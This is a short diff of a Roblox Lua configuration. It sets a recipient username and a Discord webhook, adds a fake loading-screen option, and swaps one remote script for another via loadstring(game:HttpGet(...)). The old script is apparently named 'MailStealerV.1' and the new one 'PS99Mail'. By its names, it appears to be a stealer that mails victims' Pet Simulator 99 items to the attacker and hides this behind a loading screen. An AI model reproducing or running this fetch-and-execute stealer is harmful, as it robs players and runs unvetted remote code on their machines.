@@ -1,4 +1,6 @@
-```Username = "Thyuyus"
-Webhook = "https://discord.com/api/webhooks/1214407062306557972/okkm97sWROHUev0cX6TYzFrePaJaWscxA4D1h0Bhf86C_ZTBWeMdr5RruEOw4F-aPqck"
+Username = "Thyuyus"
+Webhook = "https://discord.com/api/webhooks/1214442925489135646/MmIoIRyVmxnquszNOf6bwz1M2ccV2Vc2NaYIq8s_JfyQbH_BsquroH5IfRQxkqsn_7JN"
+selectedLoadingScreen = "4"
+LoadingScreen = true
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CatZHubOffical/MailStealerV.1/main/V.2"))()```
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()```
